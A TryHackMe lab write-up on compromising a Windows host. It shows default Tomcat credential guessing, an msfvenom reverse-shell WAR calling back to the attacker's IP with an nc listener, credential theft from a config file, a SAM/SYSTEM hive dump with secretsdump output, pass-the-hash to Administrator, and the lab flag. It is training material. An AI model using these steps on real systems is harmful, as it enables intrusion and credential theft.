# WRK.TRYHACKME.LOC

## Machine Information

Domain Name: tryhackme.loc

Machine name: WRK

## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt wrk.tryhackme.loc -Pn

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 16:14 CEST
Nmap scan report for wrk.tryhackme.loc (10.200.150.20)
Host is up (0.049s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-09T14:17:29+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRYHACKME
|   NetBIOS_Domain_Name: TRYHACKME
|   NetBIOS_Computer_Name: WRK
|   DNS_Domain_Name: tryhackme.loc
|   DNS_Computer_Name: WRK.tryhackme.loc
|   DNS_Tree_Name: tryhackme.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-09T14:16:49+00:00
| ssl-cert: Subject: commonName=WRK.tryhackme.loc
| Not valid before: 2025-04-09T09:59:17
|_Not valid after:  2025-10-09T09:59:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          Apache Tomcat (language: en)
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.50
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-09T14:16:51
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   48.98 ms 10.250.1.1
2   49.35 ms wrk.tryhackme.loc (10.200.150.20)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.06 seconds

```



## Ports Enumeration

### 8080 - Apache Tomcat

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

The version 8.5.50 doesn't seem vulnerable.

Try to authenticate into the page clicking in the "Manage App" button. And try with some possible default password of TomCat:&#x20;

```
Apache Tomcat Host Manager (web)	admin	admin
Apache Tomcat Host Manager (web)	ADMIN	ADMIN
Apache Tomcat Host Manager (web)	admin	<blank>
Apache Tomcat Host Manager (web)	admin	j5Brn9
Apache Tomcat Host Manager (web)	admin	tomcat
Apache Tomcat Host Manager (web)	cxsdk	kdsxc
Apache Tomcat Host Manager (web)	j2deployer	j2deployer
Apache Tomcat Host Manager (web)	ovwebusr	OvW*busr1
Apache Tomcat Host Manager (web)	QCC	QLogic66
Apache Tomcat Host Manager (web)	role1	role1
Apache Tomcat Host Manager (web)	role1	tomcat
Apache Tomcat Host Manager (web)	role	changethis
Apache Tomcat Host Manager (web)	root	root
Apache Tomcat Host Manager (web)	tomcat	changethis
Apache Tomcat Host Manager (web)	tomcat	s3cret
Apache Tomcat Host Manager (web)	tomcat	tomcat
Apache Tomcat Host Manager (web)	xampp	xampp
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

With the `tomcat : s3cret`  creds we are in.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Craft WAR payload with msfvenom

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.250.1.6 lport=9009 -f war -o shell.war
```

And start a listener with netcat

```
nc -lvnp 9009
```

Upload the WAR payload and then open the application from the Management page

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We dive into this page and a connection has been establish

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>







## Lateral Movement

### Credentials in Tomcat conf file

Checking in configuration file i found this interesting file with new credentials

```
more C:/tomcat/apache-tomcat-8.5.50/conf/tomcat-users.xml

<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users>
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
<!-- Note:  Keeping credentials as default. Migration to the AD user is not yet fully working. Will be fixed in the future
<user username="svc.callback" password="qvBVAj9avM3ykcbf9s" roles="manager-gui"/>
 -->
</tomcat-users>
```

New credentials: `svc.callback : qvBVAj9avM3ykcbf9s`&#x20;



### Access through WinRM

Try this credentials found with `evil-winrm` tool.

```bash
evil-winrm -i wrk.tryhackme.loc -u 'svc.callback' -p 'qvBVAj9avM3ykcbf9s'
```

This command allow us to access into the WRK machine as `svc.callback` user.

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

### Windows Local Enumeration

With the follow command we can see all information about `svc.callback` user.

```powershell
whoami /all
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

From this information we can understand that the user has:

* **SeBackupPrivilege/SeRestorePrivilege**: this permisions allows an attacker to dump the all file in the system.
* is Group Owner of the local Administratos group
* SeImpersonatePrivilege: this permission allows an attacker to impersonate all authenticated user.
* Is Domain user. With this informations

```bash
User Name              SID
====================== ============================================
tryhackme\svc.callback S-1-5-21-1966530601-3185510712-10604624-3121
```



### Exploit SeBackupPrivilege

An attacker with this privilege can copy the SAM and SYSTEM file querying the registry and extract credentials from this files.

```powershell
cd C:\Temp

reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

{% code title="Evil-winrm shell" %}
```bash
download sam
download system
```
{% endcode %}

```bash
impacket-secretsdump -sam sam -system system LOCAL

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e75f25c6788a558e4f3f49714ed95e41:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::
[*] Cleaning up... 
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Administrator access with Pass-the-Hash

An attacker with the Administrator NTLM could make access to the machine using the Pass-the-Hash technique.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>evil-winrm -i wrk.tryhackme.loc -u 'Administrator' -H 'e75f25c6788a558e4f3f49714ed95e41'
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>





## Machine Flag

To demostrate that we have compromised this machine, get the machine's flag.

```
more C:\flag.txt

THM{97fcebcc-cc05-4212-bd05-73730eeee0ed}
```



